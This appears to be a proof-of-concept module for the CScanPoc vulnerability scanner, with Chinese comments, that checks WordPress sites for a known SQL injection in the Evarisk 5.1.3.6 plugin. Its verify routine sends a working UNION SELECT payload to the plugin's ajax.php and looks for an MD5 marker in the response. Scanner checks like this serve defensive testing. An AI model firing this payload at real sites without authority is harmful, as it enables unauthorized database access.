# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '173f0260-a80b-41b4-a3fb-6ba6c6efcfb6'
    name = 'WordPress Plugin Evarisk 5.1.3.6 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2011-08-28'  # 漏洞公布时间
    desc = '''
        WordPress Plugin Evarisk 5.1.3.6 SQL注入漏洞
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/17738/' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Plugin Evarisk 5.1.3.6'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5f3102c8-6331-45b2-80aa-138762a38e70'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = ('/wp-content/plugins/evarisk/include/ajax.php?post=true&act=reloadCombo&table=wp_eva__veille_groupe_question&nomRacine=-1%22%20UNION%20ALL%20SELECT%201,MD5(3.14),3,4,5,6,7--%20')
 
            target_url=arg + payload
            code, head, res, _, _ = hh.http(target_url)
                       
            if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()